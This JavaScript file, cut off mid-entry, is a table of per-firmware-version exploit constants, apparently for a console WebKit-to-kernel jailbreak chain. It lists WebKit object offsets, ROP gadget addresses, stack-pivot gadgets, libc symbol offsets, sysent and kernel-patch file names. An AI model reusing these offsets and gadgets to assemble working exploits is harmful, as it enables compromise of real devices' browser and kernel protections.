const constants_cache = new Map();
const constants_map = {
  6: {
    0: {
      wk_CSSFontFace_sizeof: 0x128,
      wk_CSSFontFace_m_families: 0x10,
      wk_CSSFontFace_m_featureSettings_m_buffer: 0x28,
      wk_CSSFontFace_m_featureSettings_m_size: 0x30,
      wk_CSSFontFace_m_featureSettings_m_capacity: 0x34,
      wk_CSSFontFace_m_clients: 0xe8,
      wk_CSSFontFace_m_wrapper: 0x100,
      wk_CSSFontFace_m_status: 0x120,
      wk_CSSFontFace_m_thread: 0xb0,
      wk_CSSFontFace_m_function: 0xb8,
      wk_CSSFontFace_vtable: 0x223e480,
      wk_FontFace_m_backing: 0x18,
      wk_TypedArray_flags: 0x1c,
      wk_ArrayBuffer_m_contents_m_data: 0x28,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x30,
      wk_JSFunction_m_function: 0x38,
      wk_g_JSArrayBufferPoison: 0x2337a10,
      wk_g_JSFunctionPoison: 0x23379d8,
      wk_g_NativeCodePoison: 0x23379c8,

      store_view_size: 0x128,
      store_view_entry: 0x120,
      marker_storage: 0x50,
      pivot_view_sp: 0x10,

      wk_RET: 0x3c,
      wk_LEAVE_RET: 0x3798b,
      wk_POP_R8_RET: 0x79211,
      wk_POP_R9_RET: 0xcdb41,
      wk_POP_R10_RET: 0xce57d1,
      wk_POP_R11_RET: 0x0, // missing
      wk_POP_R12_RET: 0xd8c49c,
      wk_POP_R13_RET: 0x17187eb,
      wk_POP_R14_RET: 0x756ca,
      wk_POP_R15_RET: 0x24ce6d,
      wk_POP_RAX_RET: 0x75bdf,
      wk_POP_RBP_RET: 0x0b6,
      wk_POP_RBX_RET: 0x77759,
      wk_POP_RCX_RET: 0x348d3,
      wk_POP_RDI_RET: 0x24ce6e,
      wk_POP_RDX_RET: 0x201fd,
      wk_POP_RSI_RET: 0x756cb,
      wk_POP_RSP_RET: 0x75d9a,
      wk_PUSH_RAX_POP_RBP_RET: 0x33304c,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x1fb49,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x226720,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x4fa07, // temp
      wk_PUSH_RDI_POP_RSP_RET: 0x108b9c2,
      wk_MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8: 0x1874103,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120: 0x1138104,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12a0db3,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x184bc,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x599023,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2238_RAX_RET: 0x15a5580,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x1e0fe16, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x1aa05c6,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1c3c586,
      wk_expm1_builtin: 0xca2000,
      wk___imp___error: 0x2326aa0,
      wk___imp_strerror: 0x2326bf8,
      wk_pthread_create: 0x31b8,
      k__error: 0x16490,
      c_strerror: 0x42910,

      KPATCH: "600.bin",
      SYSENT_661: 0x1123130,
      JMP_RSI_GADGET: 0x3f0c9,
      EVF_OFFSET: 0x7c8971,
    },
    0x20: {
      wk_POP_R10_RET: 0xce57e1,
      wk_POP_R12_RET: 0xd8c4ac,
      wk_POP_R13_RET: 0x19b7b1a,
      wk_POP_R15_RET: 0x24ce8d,
      wk_POP_RDI_RET: 0x9e67d,
      wk_POP_RDX_RET: 0x2516b2,
      wk_PUSH_RAX_POP_RBP_RET: 0x33306c,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x226740,
      wk_PUSH_RDI_POP_RSP_RET: 0x108b9cb,
      wk_MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8: 0x1873923,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120: 0x1138114,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12a0dc3,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x599033,
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x1d6f985,

      wk_expm1_builtin: 0xca2010,

      KPATCH: "620.bin",
      SYSENT_661: 0x1127130,
      JMP_RSI_GADGET: 0x2be6e,
      EVF_OFFSET: 0x7c8e31,
    },
    0x50: {
      wk_CSSFontFace_sizeof: 0x120,
      wk_CSSFontFace_m_clients: 0xd8,
      wk_CSSFontFace_m_wrapper: 0xe0,
      wk_CSSFontFace_m_status: 0x118,

      pivot_view_sp: 0x18,

      wk_LEAVE_RET: 0x12aae7,
      wk_POP_R8_RET: 0x33212,
      wk_POP_R9_RET: 0x5c2701,
      wk_POP_R10_RET: 0x93e691,
      wk_POP_R11_RET: 0x5d761,
      wk_POP_R12_RET: 0x763180,
      wk_POP_R13_RET: 0x19b6dfa,
      wk_POP_R14_RET: 0x3d0fd,
      wk_POP_R15_RET: 0x251551,
      wk_POP_RAX_RET: 0x33213,
      wk_POP_RBX_RET: 0x5d762,
      wk_POP_RCX_RET: 0x26a5b,
      wk_POP_RDI_RET: 0x251552,
      wk_POP_RDX_RET: 0x3a9092,
      wk_POP_RSI_RET: 0x3d0fe,
      wk_POP_RSP_RET: 0x14fe7,
      wk_PUSH_RAX_POP_RBP_RET: 0x335bbc,
      wk_PUSH_RDX_POP_RSP_RET: 0xbac0b9,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x206d9,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x22b7b0,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x50a47, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x16dcdce,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120: 0x1138714,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12a3ea3,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1820c,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x59e6c3,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x21d649e, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x21d6e3e,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1c610ee,

      wk_expm1_builtin: 0xca59e0,
      wk___imp___error: 0x2566888,
      wk___imp_strerror: 0x25669e0,
      wk_pthread_create: 0x30c8,
      k__error: 0x163c0,
      c_strerror: 0x42030,

      KPATCH: "650.bin",
      SYSENT_661: 0x1124bf0,
      JMP_RSI_GADGET: 0x15a50d,
      EVF_OFFSET: 0x7c6019,
    },
    0x51: {
      EVF_OFFSET: 0x7c6099,
    },
    0x70: {
      KPATCH: "670.bin",
      SYSENT_661: 0x1125bf0,
      JMP_RSI_GADGET: 0x9d11d,
      EVF_OFFSET: 0x7c7829,
    },
  },
  7: {
    0: {
      wk_CSSFontFace_sizeof: 0xe8,
      wk_CSSFontFace_m_clients: 0x68,
      wk_CSSFontFace_m_wrapper: 0x80,
      wk_CSSFontFace_m_status: 0x9a,
      wk_CSSFontFace_m_thread: 0xd8,
      wk_CSSFontFace_m_function: 0xe0,
      wk_CSSFontFace_vtable: 0x23927c0,
      wk_ArrayBuffer_m_contents_m_data: 0x20,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x28,

      store_view_size: 0x48,
      store_view_entry: 0x40,

      wk_LEAVE_RET: 0xf2c93,
      wk_POP_R8_RET: 0x97d32,
      wk_POP_R9_RET: 0x5c6a81,
      wk_POP_R10_RET: 0x61671,
      wk_POP_R11_RET: 0x5cc31,
      wk_POP_R12_RET: 0xda462c,
      wk_POP_R13_RET: 0x19daaeb,
      wk_POP_R14_RET: 0x3c986,
      wk_POP_R15_RET: 0x24be8c,
      wk_POP_RAX_RET: 0x1fa68,
      wk_POP_RBX_RET: 0x28cfa,
      wk_POP_RCX_RET: 0x26afb,
      wk_POP_RDI_RET: 0x835d,
      wk_POP_RDX_RET: 0x52b23,
      wk_POP_RSI_RET: 0x3c987,
      wk_POP_RSP_RET: 0x78c62,
      wk_PUSH_RAX_POP_RBP_RET: 0x3315ec,
      wk_PUSH_RDX_POP_RSP_RET: 0x1152900,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x203e9,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x229070,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x508c7, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1706728,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40: 0xf1ba00,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12cfc43,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x17a4c,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x5a20d3,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_21d8_RAX_RET: 0x15d3340,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x223e25e, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x210bcde,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1c88c4a,

      wk_expm1_builtin: 0xcb3950,
      wk___imp___error: 0x2479030,
      wk___imp_strerror: 0x2479180,
      wk_pthread_create: 0x30e8,
      k__error: 0x161f0,
      c_strerror: 0x3aa10,

      KPATCH: "700.bin",
      SYSENT_661: 0x112d250,
      JMP_RSI_GADGET: 0x6b192,
      EVF_OFFSET: 0x7f92cb,
    },
    0x50: {
      wk_RET: 0x32,
      wk_LEAVE_RET: 0x25654b,
      wk_POP_R8_RET: 0x99272,
      wk_POP_R9_RET: 0x3c267b,
      wk_POP_R10_RET: 0x61d51,
      wk_POP_R11_RET: 0xd492bf,
      wk_POP_R12_RET: 0xda945c,
      wk_POP_R13_RET: 0x19ccebb,
      wk_POP_R14_RET: 0x3c826,
      wk_POP_R15_RET: 0x24d2af,
      wk_POP_RAX_RET: 0x3650b,
      wk_POP_RBX_RET: 0x15d5c,
      wk_POP_RCX_RET: 0x2691b,
      wk_POP_RDI_RET: 0x24d2b0,
      wk_POP_RDX_RET: 0x61d52,
      wk_POP_RSI_RET: 0x3c827,
      wk_POP_RSP_RET: 0x5f959,
      wk_PUSH_RAX_POP_RBP_RET: 0x33208c,
      wk_PUSH_RDX_POP_RSP_RET: 0x1155f50,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x5becb,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x22af30,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x509d7, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1701b68,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40: 0xf1f2f0,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12d1243,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x17fdf0,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x5a6d7d,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x2230a5e, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x2051e2e,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1b047de,

      wk_expm1_builtin: 0xcba120,
      wk___imp___error: 0x246bc90,
      wk___imp_strerror: 0x246bde0,
      k__error: 0x16220,
      c_strerror: 0x391d0,

      KPATCH: "750.bin",
      SYSENT_661: 0x1129f30,
      JMP_RSI_GADGET: 0x1f842,
      EVF_OFFSET: 0x79a92e,
    },
    0x51: {
      EVF_OFFSET: 0x79a96e,
    },
  },
  8: {
    0: {
      wk_LEAVE_RET: 0x291fd7,
      wk_POP_R8_RET: 0x97442,
      wk_POP_R9_RET: 0x6f501f,
      wk_POP_R10_RET: 0x60f51,
      wk_POP_R11_RET: 0xd2a629,
      wk_POP_R12_RET: 0xd8968d,
      wk_POP_R13_RET: 0x16ccff1,
      wk_POP_R14_RET: 0x3bd76,
      wk_POP_R15_RET: 0x2499df,
      wk_POP_RAX_RET: 0x35a1b,
      wk_POP_RBX_RET: 0x1537c,
      wk_POP_RCX_RET: 0x25ecb,
      wk_POP_RDI_RET: 0x1e3f87,
      wk_POP_RDX_RET: 0x60f52,
      wk_POP_RSI_RET: 0x3bd77,
      wk_POP_RSP_RET: 0xbf669,
      wk_PUSH_RAX_POP_RBP_RET: 0x32c6cc,
      wk_PUSH_RDX_POP_RSP_RET: 0x112dab0,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x5b1bb,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x227990,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40: 0xefbc30,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x4fe67, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x16d0499,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x12a6763,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x17d3c0,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x59cbfd,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_21d8_RAX_RET: 0x15a1430,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x21f43fe, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x201eec6,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x19d751e,

      wk_expm1_builtin: 0xc9c840,
      wk___imp___error: 0x2419628,
      wk___imp_strerror: 0x24198a0,
      wk_pthread_create: 0x1b38,
      k__error: 0x160c0,
      c_strerror: 0x38ab0,

      KPATCH: "800.bin",
      SYSENT_661: 0x11040c0,
      JMP_RSI_GADGET: 0xe629c,
      EVF_OFFSET: 0x7edcff,
    },
    3: {
      wk_CSSFontFace_vtable: 0x2345b60,
    },
    0x50: {
      wk_LEAVE_RET: 0x1ba53,
      wk_POP_R8_RET: 0x3b4b3,
      wk_POP_R9_RET: 0x10f372f,
      wk_POP_R10_RET: 0xb1a721,
      wk_POP_R11_RET: 0xeaba69,
      wk_POP_R12_RET: 0x4abe58,
      wk_POP_R13_RET: 0x19a0d8b,
      wk_POP_R14_RET: 0x50877,
      wk_POP_R15_RET: 0x91af9,
      wk_POP_RAX_RET: 0x1ac7b,
      wk_POP_RBX_RET: 0xc46d,
      wk_POP_RCX_RET: 0x1ac5f,
      wk_POP_RDI_RET: 0x91afa,
      wk_POP_RDX_RET: 0x282ea2,
      wk_POP_RSI_RET: 0x50878,
      wk_POP_RSP_RET: 0x73c2b,
      wk_PUSH_RAX_POP_RBP_RET: 0xf816c,
      wk_PUSH_RDX_POP_RSP_RET: 0x522d40,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x1433b,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0xccd50,
      wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40: 0x15d52a8,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x45c27, // temp
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1712509,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0xe60ab3,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x390650,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x44469e,
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x1c364ce,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x1d70b26,

      wk_expm1_builtin: 0xa9ba00,
      k__error: 0x10750,
      c_strerror: 0x38a80,

      KPATCH: "850.bin",
      SYSENT_661: 0x11041b0,
      JMP_RSI_GADGET: 0xc810d,
      EVF_OFFSET: 0x7da91c,
    },
  },
  9: {
    0: {
      wk_CSSFontFace_sizeof: 0xb8,
      wk_CSSFontFace_m_clients: 0x60,
      wk_CSSFontFace_m_wrapper: 0x68,
      wk_CSSFontFace_m_status: 0x82,
      wk_CSSFontFace_m_thread: 0xa8,
      wk_CSSFontFace_m_function: 0xb0,
      wk_CSSFontFace_vtable: 0x2e48f98,
      wk_FontFace_m_backing: 0x28,
      wk_TypedArray_flags: 0x1c,
      wk_ArrayBuffer_m_contents_m_data: 0x10,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x24,
      wk_JSFunction_m_function: 0x28,

      store_view_size: 0x20,
      store_view_entry: 0,
      marker_storage: 0x10,

      wk_LEAVE_RET: 0x8db5b,
      wk_POP_R8_RET: 0x1a7ef1,
      wk_POP_R9_RET: 0x422571,
      wk_POP_R10_RET: 0xe9e1d1,
      wk_POP_R11_RET: 0x620df9,
      wk_POP_R12_RET: 0x85ec71,
      wk_POP_R13_RET: 0x1da461,
      wk_POP_R14_RET: 0x1f4d5,
      wk_POP_R15_RET: 0x31968f,
      wk_POP_RAX_RET: 0x51a12,
      wk_POP_RBX_RET: 0xbe5d0,
      wk_POP_RCX_RET: 0x657b7,
      wk_POP_RDI_RET: 0x319690,
      wk_POP_RDX_RET: 0x986c,
      wk_POP_RSI_RET: 0x1f4d6,
      wk_POP_RBP_RET: 0x685e6e,
      wk_POP_RSP_RET: 0x4e293,
      wk_PUSH_RAX_POP_RBP_RET: 0x16d5ccc,
      wk_PUSH_RDX_POP_RSP_RET: 0x1486dba,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x613b,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x22be90,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x211262b, // temp
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x15f8b08,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x23c3a3,
      wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX: 0x2236a71,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1eab840,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x19b1061,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1920898,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2330_RAX_RET: 0x124df60,
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x2c31c8a,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x282233e,
      wk_expm1_builtin: 0x1d23560,
      wk___imp___error: 0x2f4a4d0,
      wk___imp_strerror: 0x2f4a520,
      wk_pthread_create: 0x4648,
      k__error: 0xcb80,
      c_strerror: 0x394f0,

      KPATCH: "900.bin",
      SYSENT_661: 0x1107f00,
      JMP_RSI_GADGET: 0x4c7ad,
      KL_LOCK: 0x3977f0,
      EVF_OFFSET: 0x7f6f27,
    },
    3: {
      KPATCH: "903.bin",
      SYSENT_661: 0x1103f00,
      JMP_RSI_GADGET: 0x5325b,
      KL_LOCK: 0x3959f0,
      EVF_OFFSET: 0x7f4ce7,
    },
    0x50: {
      wk_CSSFontFace_vtable: 0x2e93e78,
      wk_LEAVE_RET: 0x56322,
      wk_POP_R8_RET: 0x3fe32,
      wk_POP_R9_RET: 0xaaad51,
      wk_POP_R10_RET: 0x0, // missing
      wk_POP_R11_RET: 0x520109,
      wk_POP_R12_RET: 0x420ad1,
      wk_POP_R13_RET: 0x18fc4c1,
      wk_POP_R14_RET: 0x28c900,
      wk_POP_R15_RET: 0x1619db,
      wk_POP_RAX_RET: 0x11c46,
      wk_POP_RBX_RET: 0x13730,
      wk_POP_RCX_RET: 0x35a1e,
      wk_POP_RDI_RET: 0x5d19d,
      wk_POP_RDX_RET: 0x18de52,
      wk_POP_RSI_RET: 0x92a8c,
      wk_POP_RSP_RET: 0x253e0,
      wk_PUSH_RAX_POP_RBP_RET: 0x45569a,
      wk_PUSH_RDX_POP_RSP_RET: 0x80004a,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x10c07,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x232f2,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x12efb38,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x14e4c, // temp
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x1721ae3,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1cec2e0,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x11200f7,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2330_RAX_RET: 0x1bad320,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1c0af46,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x22e72c2, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x2c8126e,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x243e096,
      wk_expm1_builtin: 0xd05b0,
      wk___imp___error: 0x2f91ce0,
      wk___imp_strerror: 0x2f91d00,
      wk_pthread_create: 0x4748,
      k__error: 0xbb60,
      c_strerror: 0x357d0,

      KPATCH: "950.bin",
      SYSENT_661: 0x1100ee0,
      JMP_RSI_GADGET: 0x15a6d,
      KL_LOCK: 0x85ee0,
      EVF_OFFSET: 0x769a88,
    },
  },
  10: {
    0: {
      wk_CSSFontFace_m_clients: 0x58,
      wk_CSSFontFace_m_wrapper: 0x60,
      wk_CSSFontFace_m_status: 0x7a,
      wk_CSSFontFace_vtable: 0x3617a38,
      wk_FontFace_m_backing: 0x30,
      wk_TypedArray_flags: 0x20,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x28,
      wk_LEAVE_RET: 0x2ca6c3,
      wk_POP_R8_RET: 0xe881,
      wk_POP_R9_RET: 0x947b91,
      wk_POP_R11_RET: 0x0, // missing
      wk_POP_R12_RET: 0x1d83283,
      wk_POP_R13_RET: 0x15a945,
      wk_POP_R14_RET: 0x1a07f2,
      wk_POP_R15_RET: 0x495225,
      wk_POP_RAX_RET: 0xe882,
      wk_POP_RBX_RET: 0x4faa1,
      wk_POP_RCX_RET: 0x3a6c9,
      wk_POP_RDI_RET: 0x51056,
      wk_POP_RDX_RET: 0x1644b2,
      wk_POP_RSI_RET: 0xbe86,
      wk_POP_RSP_RET: 0x3a4af,
      wk_PUSH_RAX_POP_RBP_RET: 0x620b3,
      wk_PUSH_RDX_POP_RSP_RET: 0x168bc7a,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0xc037,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x7a170,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x24d28f8,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x22e31, // temp
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0xaa6d13,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x16b91a0,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x1fc94a7,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET: 0x1fd5520,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1005476,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x29c8eed, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x29c8eed,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x29699b6,
      wk_expm1_builtin: 0x218bb70,
      wk___imp___error: 0x36d1bf0,
      wk___imp_strerror: 0x36d1c20,
      wk_pthread_create: 0x20c8,
      k__error: 0x14f40,
      c_strerror: 0x10d00,

      KPATCH: "1000.bin",
      SYSENT_661: 0x110a980,
      JMP_RSI_GADGET: 0x68b1,
      KL_LOCK: 0x45b10,
      EVF_OFFSET: 0x7b5133,
    },
    0x50: {
      wk_CSSFontFace_vtable: 0x361ba28,
      wk_LEAVE_RET: 0x38712,
      wk_POP_R8_RET: 0x2cd91,
      wk_POP_R9_RET: 0x58104d,
      wk_POP_R11_RET: 0x9d6a43,
      wk_POP_R12_RET: 0x66b813,
      wk_POP_R13_RET: 0xd8b71f,
      wk_POP_R14_RET: 0x14fda5,
      wk_POP_R15_RET: 0x393a35,
      wk_POP_RAX_RET: 0x2cd92,
      wk_POP_RBX_RET: 0x16af6e,
      wk_POP_RCX_RET: 0x1da1c,
      wk_POP_RDI_RET: 0x5b8a9,
      wk_POP_RDX_RET: 0x1d9eb,
      wk_POP_RSI_RET: 0x13b027,
      wk_POP_RSP_RET: 0x9512b,
      wk_PUSH_RAX_POP_RBP_RET: 0xe74f,
      wk_PUSH_RDX_POP_RSP_RET: 0x179186a,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x18b1b,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0xc4260,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x24d49c8,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0xaaee3, // temp
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x410583,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0xb1f280,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x10e302c,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET: 0x1f47620,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x19d3844,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x264efce, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x301a376,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x29e4b9a,

      wk_expm1_builtin: 0x218dcd0,
      wk___imp___error: 0x36d5be8,
      wk___imp_strerror: 0x36d5c18,
      wk_pthread_create: 0x20d8,
      k__error: 0x1470,

      KPATCH: "1050.bin",
      SYSENT_661: 0x110a5b0,
